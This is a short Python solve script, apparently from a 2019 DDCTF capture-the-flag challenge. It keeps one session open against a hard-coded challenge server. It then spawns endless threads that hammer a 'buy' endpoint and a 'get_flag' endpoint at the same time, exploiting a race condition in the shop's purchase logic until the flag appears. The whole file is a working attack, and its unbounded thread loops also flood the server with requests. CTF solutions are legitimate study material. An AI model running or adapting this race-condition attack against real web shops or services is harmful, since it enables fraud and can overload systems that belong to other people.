#!/usr/bin/env python
# coding=utf-8

# @file solve.py
# @brief solve
# @author Anemone95,x565178035@126.com
# @version 1.0
# @date 2019-04-13 20:07

import requests
import time
import threading

s=requests.session()
s.get("http://116.85.48.107:5002/d5afe1f66147e857/?action:view;index")
def buy():
    #  burp0_url = "http://116.85.48.107:5002/d5afe1f66147e857/?action:view;shop"
    #  s.get(burp0_url)
    burp0_url = "http://116.85.48.107:5002/d5afe1f66147e857/?action:buy;5"
    res=s.get(burp0_url)
    #  print(res.text)

def get_flag():
    burp0_url = "http://116.85.48.107:5002/d5afe1f66147e857/?action:get_flag;null"
    res=s.get(burp0_url)
    if "DDCTF" in res.text:
        print(res.text)

def while_buy():
    while True:
        a = threading.Thread(target=buy,args=())
        a.start()

def while_flag():
    while True:
        a = threading.Thread(target=get_flag,args=())
        a.start()

def solve():
    b = threading.Thread(target=while_flag,args=())
    b.start()
    a = threading.Thread(target=while_buy,args=())
    a.start()


if __name__ == '__main__':
    solve()
